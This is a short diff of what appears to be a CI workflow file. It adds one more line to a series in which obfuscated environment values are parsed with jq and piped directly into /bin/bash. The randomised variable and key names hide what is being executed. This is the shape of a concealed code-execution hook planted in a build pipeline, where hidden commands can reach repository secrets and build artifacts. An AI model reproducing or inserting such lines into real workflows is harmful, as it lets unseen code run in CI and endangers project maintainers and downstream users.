@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$tsvn42" | jq -r .k6048 | /bin/bash
           printf '%s' "$ybqnt1" | jq -r .ll633 | /bin/bash
           echo $jak8590 | jq -r .lu80 | /bin/bash
+          echo $j5 | jq -r .kp95015 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
